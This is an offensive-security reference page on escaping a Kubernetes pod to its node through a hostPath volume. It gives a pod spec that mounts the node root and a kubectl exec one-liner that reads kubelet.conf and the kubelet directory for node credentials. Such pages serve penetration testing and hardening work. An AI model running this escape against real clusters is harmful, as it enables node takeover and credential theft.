---
title: "hostPath mount: reaching the node filesystem from a pod"
description: "Escaping to a Kubernetes node from a pod that mounts a node path with a hostPath volume, reading node credentials and writing to the host filesystem, which reaches the node even without a privileged security context."
keywords:
  - hostPath
  - node filesystem
  - pod volume
  - kubelet directory
  - kubernetes escape
---

# hostPath mount

A `hostPath` volume binds a node directory into the pod. Mounting the node root, or sensitive paths like the kubelet directory, reads node credentials and writes host files, which is node compromise without needing a privileged pod at all.

```yaml
# Pod spec fragment: mount the node root filesystem INTO the container
containers:
  - name: c
    image: alpine
    command: ["sleep", "1d"]
    volumeMounts:
      - name: host
        mountPath: /host
volumes:
  - name: host
    hostPath: { path: / }
# then in the container, chroot /host or read /host/var/lib/kubelet/...
```

```bash
kubectl exec -it pwn -- sh -c 'ls /host/var/lib/kubelet/; cat /host/etc/kubernetes/kubelet.conf'
```

## Exploitation notes

- The breakout is the generic [Host path mount](../../../container-escape/sensitive-mounts/host-path-mount.md); the hostPath volume is how Kubernetes delivers it.
- Even a read-only or partial hostPath (the kubelet directory, `/etc/kubernetes`) leaks node and pod credentials, see [Kubelet credential theft](kubelet-credential-theft.md).
- Pod Security `baseline` restricts hostPath, so it is most useful where admission is permissive or absent.

## References

- [Kubernetes: hostPath volumes](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)
- [Kubernetes: Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
